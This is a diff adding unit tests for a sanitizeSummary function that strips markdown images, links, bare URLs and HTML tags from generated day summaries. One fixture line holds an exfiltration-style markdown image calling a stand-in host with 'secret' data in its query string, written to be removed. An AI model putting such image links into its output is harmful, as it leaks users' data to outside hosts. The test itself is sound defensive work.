@@ -5,6 +5,7 @@ import {
 	deterministicSummary,
 	inRange,
 	parseTimestamp,
+	sanitizeSummary,
 	stripThink,
 	type DayTask,
 } from '../daySummary';
@@ -254,6 +255,40 @@ describe('stripThink', () => {
 
 	it('leaves plain text unchanged apart from trimming', () => {
 		expect(stripThink('  Plain text \n')).toBe('Plain text');
+	});
+});
+
+describe('sanitizeSummary', () => {
+	it('removes a markdown image together with any data in its url', () => {
+		expect(
+			sanitizeSummary('- Done ![x](https://evil.example/p?d=TM-1%20secret)'),
+		).toBe('- Done ');
+	});
+
+	it('keeps the label of a markdown link and drops its url', () => {
+		expect(sanitizeSummary('See [the report](https://example.com/r)')).toBe(
+			'See the report',
+		);
+	});
+
+	it('removes a bare http and https url', () => {
+		expect(sanitizeSummary('Check https://example.com/a?b=1 today')).toBe(
+			'Check  today',
+		);
+		expect(sanitizeSummary('Mirror http://example.com/x')).toBe('Mirror ');
+	});
+
+	it('removes raw html tags', () => {
+		expect(sanitizeSummary('<img src="https://e.example/x.png">- Item')).toBe(
+			'- Item',
+		);
+		expect(sanitizeSummary('<b>bold</b> text')).toBe('bold text');
+	});
+
+	it('leaves normal bullets and comparison signs untouched', () => {
+		const text =
+			'- Wrote TM-1 (now: Done)\n- Commented 2 times\nOpen items:\n- x < 5 and y > 3';
+		expect(sanitizeSummary(text)).toBe(text);
 	});
 });
 
